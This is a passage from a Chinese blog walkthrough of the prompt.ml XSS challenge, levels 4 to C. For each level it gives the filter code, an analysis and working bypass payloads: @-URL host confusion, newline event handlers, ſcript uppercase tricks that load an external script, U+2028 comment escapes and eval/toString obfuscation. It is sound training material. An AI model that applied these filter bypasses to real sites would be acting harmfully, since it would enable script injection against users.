class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">只能匹配http:<span class="comment">//prompt.ml/或//prompt.ml/下网址,可以利用@绕过访问从而其他域名。</span></span><br><span class="line">这里需要把它的/用url编码<span class="meta">%</span><span class="number">2</span>f,@后的ip填写我php环境搭建的地址,其中的pro.js文件内</span><br><span class="line">填写prompt<span class="comment">(1)</span>即可。</span><br><span class="line">最终payload为：http:<span class="comment">//prompt.ml%2f@10.60.250.250/pro.js</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Solutions-4"><a href="#Solutions-4" class="headerlink" title="Solutions:"></a>Solutions:</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="selector-class">.http</span>:<span class="comment">//prompt.ml%2f@10.60.250.250/pro.js</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Img-4"><a href="#Img-4" class="headerlink" title="Img:"></a>Img:</h2><ol>
+<li><code>http://prompt.ml%2f@10.60.250.250/pro.js</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level4_001.png" alt="4_1"></p>
+<h1 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h1><h2 id="Code-5"><a href="#Code-5" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> escape(input) &#123;</span><br><span class="line">    //<span class="built_in"> apply</span> <span class="keyword">strict</span><span class="built_in"> filter</span> rules <span class="keyword">of</span> level <span class="number">0</span></span><br><span class="line">    //<span class="built_in"> filter</span> <span class="string">"&gt;"</span> <span class="keyword">and</span> event handlers</span><br><span class="line">    input = input<span class="built_in">.replace</span>(/&gt;|on.+?=|focus/gi, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将&gt; onXXX= focus替代为了_ (其中XXX代表任意字符)</span><br><span class="line">过滤&gt;的目的是为了防止&gt;构造闭合。</span><br><span class="line">过滤<span class="attribute">onXXX</span>=是为了过滤on开头的事件。</span><br><span class="line">过滤focus是为了过滤focus事件</span><br><span class="line">对于&lt;input <span class="attribute">value</span>=<span class="string">""</span> <span class="attribute">type</span>=<span class="string">"text"</span>&gt;中type和value的顺序,能够利用img</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solutions-5"><a href="#Solutions-5" class="headerlink" title="Solutions:"></a>Solutions:</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>用换行绕过onXXX=</span><br><span class="line"><span class="string">" type='image' src=''  onerror</span></span><br><span class="line"><span class="string">="</span>prompt(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Img-5"><a href="#Img-5" class="headerlink" title="Img:"></a>Img:</h2><p>1.</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" type='image' src=''  onerror</span></span><br><span class="line">=<span class="string">"prompt(1)</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/prompt_ml/level5_001.png" alt="5_1"></p>
+<h1 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h1><h2 id="Code-6"><a href="#Code-6" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function escape(<span class="keyword">input</span>) &#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    try &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = <span class="keyword">input</span>.<span class="keyword">split</span>('#');</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[0];</span><br><span class="line">        <span class="keyword">var</span> formData = JSON.<span class="keyword">parse</span>(segments[1]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="keyword">form</span> = document.createElement('<span class="keyword">form</span>');</span><br><span class="line">        <span class="keyword">form</span>.action = formURL;</span><br><span class="line">        <span class="keyword">form</span>.method = '<span class="keyword">post</span>';</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="keyword">input</span> = <span class="keyword">form</span>.appendChild(document.createElement('<span class="keyword">input</span>'));</span><br><span class="line">            <span class="keyword">input</span>.name = i;</span><br><span class="line">            <span class="keyword">input</span>.setAttribute('value', formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">form</span>.outerHTML + '                         \<span class="keyword">n</span>\</span><br><span class="line">    &lt;script&gt;                                                  \<span class="keyword">n</span>\</span><br><span class="line">        <span class="comment">// forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line">        <span class="keyword">if</span> (!/script:|data:/i.<span class="keyword">test</span>(document.forms[0].action)) \<span class="keyword">n</span>\</span><br><span class="line">            document.forms[0].submit();                       \<span class="keyword">n</span>\</span><br><span class="line">        <span class="keyword">else</span>                                                  \<span class="keyword">n</span>\</span><br><span class="line">            document.write(<span class="string">"Action forbidden."</span>)               \<span class="keyword">n</span>\</span><br><span class="line">    &lt;/script&gt;                                                 \<span class="keyword">n</span>\</span><br><span class="line">        ';</span><br><span class="line">    &#125; catch (<span class="keyword">e</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> 'Invalid <span class="keyword">form</span> data.';</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">以http:<span class="comment">//httpbin.org/post#&#123;"name":"Matt"&#125;为例</span></span><br><span class="line">用#分成两部分http:<span class="comment">//httpbin.org/post和&#123;"name":"Matt"&#125;</span></span><br><span class="line">将http:<span class="comment">//httpbin.org/post放入表单的action</span></span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Matt"</span>&#125;的<span class="keyword">name</span>放入input的<span class="keyword">name</span>属性,value=Matt</span><br><span class="line">如下：</span><br><span class="line">&lt;form action=<span class="string">"http://httpbin.org/post"</span> method=<span class="string">"post"</span>&gt;&lt;input <span class="keyword">name</span>=<span class="string">"name"</span> value=<span class="string">"Matt"</span>&gt;&lt;/form&gt;</span><br><span class="line">之后检查http:<span class="comment">//httpbin.org/post中是否有script:或者data:</span></span><br><span class="line">检查到就报错,没有就提交,目的是禁止使用类似下面的javascript，vbscript和<span class="keyword">data</span></span><br><span class="line">javascript:alert(<span class="number">1</span>)<span class="comment">//</span></span><br><span class="line">vbscript:alert(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">data</span>:<span class="keyword">text</span>/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span><br></pre></td></tr></table></figure>
+
+<p>这一课比较抽象,看下答案<code>javascript:prompt(1)#{&quot;action&quot;:1}</code>后做了下实验,通过将input中的name属性设action,能将</p>
+<p>form表单中的action替换成input的。因为input的action为[object HTMLInputElement],所以</p>
+<p>if (!/script:|data:/i.test(document.forms[0].action))就匹配不到,返回False后经过！为真,成功绕过。</p>
+<p><img src="/img/xss/prompt_ml/level6_001.png" alt="6_1"></p>
+<p><img src="/img/xss/prompt_ml/level6_002.png" alt="6_2"></p>
+<h2 id="Solutions-6"><a href="#Solutions-6" class="headerlink" title="Solutions:"></a>Solutions:</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="selector-class">.javascript</span>:prompt(<span class="number">1</span>)#&#123;<span class="string">"action"</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Img-6"><a href="#Img-6" class="headerlink" title="Img:"></a>Img:</h2><ol>
+<li><code>javascript:prompt(1)#{&quot;action&quot;:1}</code><br> <img src="/img/xss/prompt_ml/level6_003.png" alt="6_3"></li>
+</ol>
+<h1 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h1><h2 id="Code-7"><a href="#Code-7" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> &#123;</span></span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    var segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span><span class="params">(title)</span> &#123;</span></span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="</span>comment<span class="string">" title="</span><span class="string">' + title.slice(0, 12) + '</span><span class="string">"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析:"></a>分析:</h2><p>通过split将字符串分割成数组,再通过数组的map方法能创建新的数组,新数组格式加工成了</p>
+<p><code>&lt;p class=&quot;comment&quot; title=&quot;最长只有12字符的内容&quot;&gt;&lt;/p&gt;</code></p>
+<p>slice(0,12):取前12个字符。</p>
+<p>来张图体会一下</p>
+<p><img src="/img/xss/prompt_ml/level7_001.png" alt="7_1"></p>
+<p>能修改的内容就是tittle处了,#来分割的新数组。</p>
+<p>可以利用多行注释来打通,注意到一段只有12个字符,要简洁。</p>
+<p>考虑到最短要使用到<code>&lt;svg/onload=prompt(1)</code>的变形。</p>
+<h2 id="Solutions-7"><a href="#Solutions-7" class="headerlink" title="Solutions:"></a>Solutions:</h2><ol>
+<li><p><code>&quot;&gt;&lt;svg/a=&#39;#&#39;onload=&#39;/*#*/prompt(1)&#39;</code><br>官方答案短一个字符…<br><code>&quot;&gt;&lt;svg/a=#&quot;onload=&#39;/*#*/prompt(1)&#39;</code></p>
+</li>
+<li><p>利用eval函数特性执行拼接内容<br><code>&quot;&gt;&lt;script&gt;/*#*/a=&#39;prom&#39;/*#*/+&#39;pt(1)&#39;/*#*/eval(a)/*#*/&lt;/script&gt;</code></p>
+</li>
+<li><p>利用换行</p>
+</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="comment">/*#*/</span>prompt(<span class="comment">/*#*/</span><span class="number">1</span>)<span class="comment">/*#*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><code>&quot;&gt;&lt;script&gt;`#${prompt(1)}#`&lt;/script&gt;</code></li>
+</ol>
+<h2 id="Img-7"><a href="#Img-7" class="headerlink" title="Img:"></a>Img:</h2><ol>
+<li><code>&quot;&gt;&lt;svg/a=&#39;#&#39;onload=&#39;/*#*/prompt(1)&#39;</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level7_002.png" alt="7_2"></p>
+<ol start="2">
+<li><code>&quot;&gt;&lt;script&gt;/*#*/a=&#39;prom&#39;/*#*/+&#39;pt(1)&#39;/*#*/eval(a)/*#*/&lt;/script&gt;</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level7_003.png" alt="7_3"></p>
+<ol start="3">
+<li>1234是为了换行</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="comment">/*#*/</span>prompt(<span class="comment">/*#*/</span><span class="number">1</span>)<span class="comment">/*#*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/prompt_ml/level7_004.png" alt="7_4"></p>
+<ol start="4">
+<li><code>&quot;&gt;&lt;script&gt;`#${prompt(1)}#`&lt;/script&gt;</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level7_005.png" alt="7_5"></p>
+<h1 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h1><h2 id="Code-8"><a href="#Code-8" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">    &lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">        // console.log("'</span> + input + <span class="string">'");        \n\</span></span><br><span class="line"><span class="string">    &lt;/script&gt; '</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-8"><a href="#分析-8" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">过滤了换行 &lt; /,解决这题需要绕过换行。</span><br><span class="line">官方给的答案是：</span><br><span class="line">[U+<span class="number">2028</span>]prompt(<span class="number">1</span>)[U+<span class="number">2028</span>]<span class="function">--&gt;</span></span><br><span class="line">这里很多人的都没成功，我在firefox下也没成功,不过chrome是可以的。</span><br><span class="line">prompt<span class="function"><span class="params">(<span class="number">1</span>)</span>--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>[U+2028]特殊字符在这复制：<a href="https://unicode-table.com/en/#2028" target="_blank" rel="noopener">https://unicode-table.com/en/#2028</a></p>
+<html><b>&#8232;prompt(1)&#8232;&#x2d;&#x2d;></b></html>
+
+<p><img src="/img/xss/prompt_ml/level8_001.png" alt="8_1"></p>
+<h2 id="Solutions-8"><a href="#Solutions-8" class="headerlink" title="Solutions:"></a>Solutions:</h2><p>仅对chrome有用,firefox不行</p>
+<html><b>&#8232;prompt(1)&#8232;&#x2d;&#x2d;></b></html>
+
+<h2 id="Img-8"><a href="#Img-8" class="headerlink" title="Img:"></a>Img:</h2><ol>
+<li><img src="/img/xss/prompt_ml/level8_002.png" alt="8_2"></li>
+</ol>
+<h1 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h1><h2 id="Code-9"><a href="#Code-9" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span></span> &#123;</span><br><span class="line">    // filter potential start-tags</span><br><span class="line">    <span class="built_in">input</span> = <span class="built_in">input</span>.replace(/&lt;([a-zA-Z])/g, <span class="string">'&lt;_$1'</span>);</span><br><span class="line">    // use all-caps <span class="keyword">for</span> heading</span><br><span class="line">    <span class="built_in">input</span> = <span class="built_in">input</span>.toUpperCase();</span><br><span class="line"></span><br><span class="line">    // sample <span class="built_in">input</span>: you shall <span class="keyword">not</span> pass! =&gt; YOU SHALL NOT PASS!</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + <span class="built_in">input</span> + <span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-9"><a href="#分析-9" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将&lt;XXX 替换成&lt;_XXX (XXX表示任意字符)</span><br><span class="line">然后把小写转换成大写。</span><br><span class="line">可以引用外部文件,利用js的scrpit,src和域名的大小写不敏感绕过。再利用toUpperCase()的特性，它不仅转换英文字母，也转换一些<span class="built_in">Unicode</span>字符，比如将ſ传入就可以转换为S。</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solutions-9"><a href="#Solutions-9" class="headerlink" title="Solutions:"></a>Solutions:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. </span><br><span class="line"><span class="tag">&lt;<span class="name">ſcript</span> <span class="attr">src</span>=<span class="string">"http://192.168.75.132/pro.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">这是我本地phpstudy下的pro.js文件,内容只有prompt(1)。</span><br></pre></td></tr></table></figure>
+
+<h2 id="Img-9"><a href="#Img-9" class="headerlink" title="Img:"></a>Img:</h2><p><img src="/img/xss/prompt_ml/level9_001.png" alt="9_1"></p>
+<ol>
+<li><code>&lt;ſcript src=&quot;http://192.168.75.132/pro.js&quot;&gt;&lt;/script&gt;</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level9_002.png" alt="9_2"></p>
+<h1 id="Level-A"><a href="#Level-A" class="headerlink" title="Level A"></a>Level A</h1><h2 id="Code-10"><a href="#Code-10" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line">    <span class="comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-10"><a href="#分析-10" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。该方法不会对 <span class="keyword">ASCII</span> 字母和数字进行编码，也不会对这些 <span class="keyword">ASCII</span> 标点符号进行编码： - _ . ! ~ * ' ( ) 。</span><br><span class="line">而接下来又将‘消除,传如promp't</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solutions-10"><a href="#Solutions-10" class="headerlink" title="Solutions:"></a>Solutions:</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> </span><br><span class="line">promp't(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Img-10"><a href="#Img-10" class="headerlink" title="Img:"></a>Img:</h2><ol>
+<li><code>promp&#39;t(1)</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/levelA_001.png" alt="A_1"></p>
+<h1 id="Level-B"><a href="#Level-B" class="headerlink" title="Level B"></a>Level B</h1><h2 id="Code-11"><a href="#Code-11" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> &#123;</span></span><br><span class="line">    <span class="comment">// name should not contain special characters</span></span><br><span class="line">    var memberName = input.replace(/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data to be parsed as JSON</span></span><br><span class="line">    var dataString = <span class="string">'&#123;"</span>action<span class="string">":"</span>login<span class="string">","</span>message<span class="string">":"</span>Welcome back, <span class="string">' + memberName + '</span>.<span class="string">"&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// directly "parse" data in script context</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">    &lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">        var data = '</span> + dataString + <span class="string">';          \n\</span></span><br><span class="line"><span class="string">        if (data.action === "</span>login<span class="string">")            \n\</span></span><br><span class="line"><span class="string">            document.write(data.message)        \n\</span></span><br><span class="line"><span class="string">    &lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-11"><a href="#分析-11" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将以下符号消除</span><br><span class="line">[ | 空白符 + * \ &lt; &gt; &amp; ^ : ; = ~ ! <span class="comment">% -</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Solutions-11"><a href="#Solutions-11" class="headerlink" title="Solutions:"></a>Solutions:</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 测试时发现<span class="keyword">json对象的名称相同时会取最右的值,但是这里过滤了：,有什么办法绕过呢。</span></span><br><span class="line"><span class="keyword">官方答案是:"(prompt(1))in"</span></span><br><span class="line"><span class="keyword">in是js的关系操作符</span></span><br><span class="line"><span class="keyword">这个会发生js错误，但是能执行prompt(1)</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">同样答案也可是："(prompt(1))instanceof"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/prompt_ml/levelB_001.png" alt="B_1"></p>
+<h2 id="Img-11"><a href="#Img-11" class="headerlink" title="Img:"></a>Img:</h2><ol>
+<li><p><code>&quot;(prompt(1))in&quot;</code></p>
+<p><img src="/img/xss/prompt_ml/levelB_002.png" alt="B_2"></p>
+</li>
+<li><p><code>&quot;(prompt(1))instanceof&quot;</code></p>
+<p><img src="/img/xss/prompt_ml/levelB_003.png" alt="B_3"></p>
+</li>
+</ol>
+<h1 id="Level-C"><a href="#Level-C" class="headerlink" title="Level C"></a>Level C</h1><h2 id="Code-12"><a href="#Code-12" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// in Soviet Russia...</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// table flips you!</span></span><br><span class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ノ┬─┬ノ ︵ ( \o°o)\</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-12"><a href="#分析-12" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。该方法不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - <span class="symbol">_</span> . ! ~ * ' ( ) 。</span><br><span class="line"></span><br><span class="line">这里只能利用编码了</span><br><span class="line">参考答案利用parseInt(字符串,基数)函数将字符串转换成整数,用指定基数表示。</span><br><span class="line">parseInt(<span class="string">"prompt"</span>,<span class="number">36</span>); //<span class="number">1558153217</span></span><br><span class="line">然后又用toString转化回来,用<span class="built_in">concat</span>函数拼接编码的(<span class="number">1</span>)</span><br><span class="line">参考答案:</span><br><span class="line"><span class="built_in">eval</span>((<span class="number">1558153217</span>).toString(<span class="number">36</span>).<span class="built_in">concat</span>(String.fromCharCode(<span class="number">40</span>)).<span class="built_in">concat</span>(<span class="number">1</span>).<span class="built_in">concat</span>(String.fromCharCode(<span class="number">41</span>)))</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solutions-12"><a href="#Solutions-12" class="headerlink" title="Solutions:"></a>Solutions:</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>eval((<span class="number">1558153217</span>).toString(<span class="number">36</span>).concat(String.fromCharCode(<span class="number">40</span>)).concat(<span class="number">1</span>).concat(String.fromCharCode(<span class="number">41</span>)))</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 参考答案的简化版,因为没有对(<span class="number">1</span>)过滤</span><br><span class="line">eval((<span class="number">630038579</span>).toString(<span class="number">30</span>))(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
